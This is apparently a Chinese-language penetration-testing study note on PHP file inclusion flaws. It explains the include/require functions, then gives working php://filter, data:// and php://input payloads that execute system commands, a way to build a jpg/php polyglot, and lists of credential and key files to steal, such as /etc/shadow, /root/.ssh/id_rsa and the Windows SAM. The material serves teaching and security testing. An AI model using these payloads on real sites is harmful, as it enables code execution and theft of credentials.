![](https://z3.ax1x.com/2021/09/26/46Fdvn.png)

远程文件包含条件：allow_url_include=On(默认关闭)

将文件以脚本的格式执行（根据当前网站脚本类型）

文件包含在 php 中，涉及到的危险函数有四个，分别是include()、include_once()、require()、require_once()

区别如下：

include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。

require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。require_once：和 require 类似，不同处在于 require_once 只导入一次。

![](https://z3.ax1x.com/2021/09/26/46Fq8H.png)

![](https://z3.ax1x.com/2021/10/12/5mPl7Q.png)

```php
如果 PHP 的配置选项 allow_url_include、allow_url_fopen 状态为 ON 的话，则include/require 函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（RFI） file://+路径：将文件以脚本执行data://php://filter 可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启，读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了php://input?test=php://input 【post data】<?php phpinfo();?>
```

~~~php
php://filter/read=convert.base64-encode/resource=要读取的文件

data://text/plain;base64,xxxx
<?php system("dir")?> base64编码后使用
?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b  (注意编码后的+号要URL编码)
<?php system("cat fl4gisisish3r3.php")?> base64编码后使用
?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==

?page=data://text/plain,<?phpprint_r(scandir(/var/www));?>
利用这条 payload 就可以读出当前目录的文件。
  
~~~

文件被解析，则是文件包含漏洞

显示源代码，则是文件读取漏洞

提示文件下载，则是文件下载漏洞，凡是有下载功能的地方都可能有下载漏洞

#### 重点：

当我们想利用文件文件包含jpg执行脚本代码，或者中间件的解析漏洞时，比如说

~~~
1.jpg	正常图片
1.txt	<?php phpinfo();?>
2.jpg	合成1.jpg和1.txt文件得到的
~~~



那么我们执行`Copy 1.jpg/b + 1.txt/a 2.jpg`，得到的2.jpg文件形式打开包含了php代码，如图

[![bDYPns.png](https://s1.ax1x.com/2022/03/06/bDYPns.png)](https://imgtu.com/i/bDYPns)



```php
根据上图修改路径下载文件：
数据库、平台……配置文件
Windows
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php 配置信息
C:\Windows\my.ini //Mysql 配置信息
C:\Windows\win.ini //Windows 系统的一个基本系统配置文件
```

~~~php
Linux
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/usr/local/app/php5/lib/php.ini //PHP 配置文件
/etc/my.cnf //mysql 配置文件
/etc/httpd/conf/httpd.conf //apache 配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql 历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的 cmdline 参数
都可以尝试下载
~~~

文件包含的危害：

1. 配合文件上传，可以上传非脚本格式文件包含后并以脚本格式执行
2. 利用伪协议读源码，读文本内容；读数据库和脚本配置文件，读日志（可能泄露ftp密码，ssh-log）
3. 代码执行-->命令执行、写webshell